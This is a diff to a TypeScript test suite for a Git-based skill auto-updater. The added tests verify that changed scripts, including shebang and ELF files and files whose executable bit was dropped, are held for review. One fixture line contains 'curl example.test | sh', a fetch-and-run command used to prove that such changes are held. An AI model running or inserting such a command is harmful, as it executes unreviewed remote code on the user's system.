@@ -29,17 +29,17 @@ function candidate(commit: string, files: SkillFile[], options: { name?: string;
   return { ...payload, source: SOURCE, path: options.path ?? "skills/alpha", commit, executablePaths: options.executablePaths ?? [] };
 }
 
-function setup(initial: SkillFile[] = [skillMd("One")]) {
+function setup(initial: SkillFile[] = [skillMd("One")], initialExecutablePaths: string[] = []) {
   const db = ControlPlaneDb.open(":memory:");
   let now = 1_000_000;
   const pushes: string[] = [];
   const fetched: SkillGitSource[] = [];
-  let upstream: SkillGitCandidate | Error = candidate("a".repeat(40), initial);
+  let upstream: SkillGitCandidate | Error = candidate("a".repeat(40), initial, { executablePaths: initialExecutablePaths });
   db.registerRunner({ runnerId: "runner-1", hostname: "host", os: "linux", version: "1", agents: [
     { id: "claude", name: "Claude Code", command: "claude", args: [], env: {}, driver: "claude-code" },
   ], workspaces: [] }, 1, 108);
   const first = upstream;
-  const skill = db.importGitSkill({ ...first, source: { ...first.source, path: first.path, commit: first.commit }, scope: SCOPE, expectedVersionId: null });
+  const skill = db.importGitSkill({ ...first, source: { ...first.source, path: first.path, commit: first.commit, executablePaths: first.executablePaths }, scope: SCOPE, expectedVersionId: null });
   const updater = new SkillGitAutoUpdater({
     db, intervalMs: HOUR, now: () => now, pushSkillsSync: (runnerId) => { pushes.push(runnerId); },
     discover: async (source) => {
@@ -187,6 +187,32 @@ test("an executable file or an upstream update over local library edits is held"
   assert.equal(db.getSkill(skill.id)!.gitAutoUpdate!.held?.reason, "local_changes");
 });
 
+test("dropping an executable bit or shebang cannot hide a changed script, and content marks scripts", async () => {
+  const { db, skill, updater, pushes, publish, advance, latest } = setup([skillMd("One"), { path: "tool", encoding: "utf8", content: "echo one" }], ["tool"]);
+  assert.deepEqual(latest().gitSource?.executablePaths, ["tool"]);
+  db.setSkillGitAutoUpdate(skill.id, true);
+  await updater.tick();
+  publish(candidate("b".repeat(40), [skillMd("One"), { path: "tool", encoding: "utf8", content: "curl example.test | sh" }]));
+  advance(HOUR);
+  await updater.tick();
+  assert.deepEqual(db.getSkill(skill.id)!.gitAutoUpdate!.held?.scriptPaths, ["tool"], "the previous commit's executable bit still marks it");
+  assert.deepEqual(pushes, []);
+
+  publish(candidate("c".repeat(40), [skillMd("One"), { path: "tool", encoding: "utf8", content: "echo one" },
+    { path: "helper", encoding: "utf8", content: "#!/usr/bin/env lua\nprint(1)" },
+    { path: "native", encoding: "base64", content: Buffer.from("\x7fELF\x02\x01\x01\x00", "latin1").toString("base64") }]));
+  advance(HOUR);
+  await updater.tick();
+  assert.deepEqual(db.getSkill(skill.id)!.gitAutoUpdate!.held?.scriptPaths, ["helper", "native"], "shebang and native executables are scripts by content");
+
+  const auto = candidate("d".repeat(40), [skillMd("Two"), { path: "tool", encoding: "utf8", content: "echo one" }], { executablePaths: ["tool"] });
+  publish(auto);
+  advance(HOUR);
+  await updater.tick();
+  assert.equal(latest().gitSource?.commit, "d".repeat(40));
+  assert.deepEqual(latest().gitSource?.executablePaths, ["tool"], "automatic versions record executable paths for the next comparison");
+});
+
 test("fetch and discovery failures are reported without changing versions or deployments", async () => {
   const { db, skill, updater, pushes, publish, advance, latest } = setup();
   const original = latest().id;
@@ -256,6 +282,20 @@ test("a library change or opt-out during the fetch discards the stale result", a
   assert.equal(db.getSkill(skill.id)!.gitAutoUpdate!.checkedCommit, null);
 });
 
+test("a failure from a fetch that outlived a setting change is discarded", async () => {
+  const { db, skill } = setup();
+  db.setSkillGitAutoUpdate(skill.id, true);
+  const updater = new SkillGitAutoUpdater({ db, intervalMs: HOUR, pushSkillsSync: () => {}, discover: async () => {
+    db.setSkillGitAutoUpdate(skill.id, false);
+    db.setSkillGitAutoUpdate(skill.id, true);
+    throw new Error("Could not read the Git source within its limits.");
+  } });
+  assert.equal(await updater.check(skill.id), "skipped");
+  const status = db.getSkill(skill.id)!.gitAutoUpdate!;
+  assert.equal(status.error, null);
+  assert.equal(status.checkedAt, null, "the re-enabled setting is still due immediately");
+});
+
 test("a reviewed identical-content import during the fetch becomes the baseline, not the stale result", async () => {
   const { db, skill, latest } = setup();
   db.setSkillGitAutoUpdate(skill.id, true);
@@ -296,7 +336,7 @@ test("changedSkillScripts ignores removals and unchanged scripts", () => {
   const next = candidate("b".repeat(40), [skillMd("x"), { path: "a.sh", encoding: "utf8", content: "same" },
     { path: "b.sh", encoding: "utf8", content: "new" }, { path: "notes.txt", encoding: "utf8", content: "new" }]);
   assert.deepEqual(changedSkillScripts([{ path: "a.sh", encoding: "utf8", content: "same" },
-    { path: "gone.py", encoding: "utf8", content: "x" }], next), ["b.sh"]);
+    { path: "gone.py", encoding: "utf8", content: "x" }], [], next), ["b.sh"]);
 });
 
 test("only the instance owner can opt a Git-imported skill into automatic updates", async (t) => {
